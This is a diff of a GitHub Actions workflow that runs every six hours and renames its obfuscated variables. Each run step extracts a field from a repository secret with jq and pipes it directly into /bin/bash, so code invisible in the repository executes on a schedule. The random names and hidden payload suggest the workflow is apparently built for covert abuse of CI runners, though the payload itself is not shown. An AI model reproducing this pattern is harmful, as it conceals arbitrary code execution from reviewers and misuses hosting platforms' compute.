@@ -3,31 +3,26 @@ name: mingyulu1837
 on:
   workflow_dispatch:
   schedule:
-    - cron: '59 1/6 * * *'
+    - cron: '8 1/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: mingyulu1837
         env:
-          brirk396: ${{ secrets.brirk396 }}
+          h5052: ${{ secrets.h5052 }}
         run: |
-          echo $brirk396 | jq -r .m615 | /bin/bash
-          echo $yfa37 | jq -r .c8262 | /bin/bash
-          echo $ii60865 | jq -r .mvya1 | /bin/bash
-          echo $wcshf869 | jq -r .e1 | /bin/bash
-          echo $lyyb010 | jq -r .mc53853 | /bin/bash
-          echo $lvb60 | jq -r .ewp95 | /bin/bash
-          echo $ds57 | jq -r .w43164 | /bin/bash
-          echo $le6 | jq -r .qobw6360 | /bin/bash
-          echo $vbeyb0962 | jq -r .ji9409 | /bin/bash
-          echo $tm5 | jq -r .zc5027 | /bin/bash
-          echo $kgt09 | jq -r .nl07127 | /bin/bash
-          echo $axl72778 | jq -r .c5 | /bin/bash
-          echo $knslt305 | jq -r .kbs2535 | /bin/bash
-          echo $kkhzl780 | jq -r .vn0 | /bin/bash
-          echo $w92736 | jq -r .yqcqn3970 | /bin/bash
-          echo $l721 | jq -r .jds0429 | /bin/bash
+          echo $h5052 | jq -r .yzoy249 | /bin/bash
+          echo $ib8424 | jq -r .siq23 | /bin/bash
+          echo $e46022 | jq -r .hlnli7520 | /bin/bash
+          echo $ap709 | jq -r .h5 | /bin/bash
+          echo $shmo167 | jq -r .pjqow82940 | /bin/bash
+          echo $g00543 | jq -r .ocpuz59 | /bin/bash
+          echo $m562 | jq -r .xuox549 | /bin/bash
+          echo $kszvm01444 | jq -r .sk3348 | /bin/bash
+          echo $vvhj3234 | jq -r .us852 | /bin/bash
+          echo $rnfvt793 | jq -r .usxkj0 | /bin/bash
 
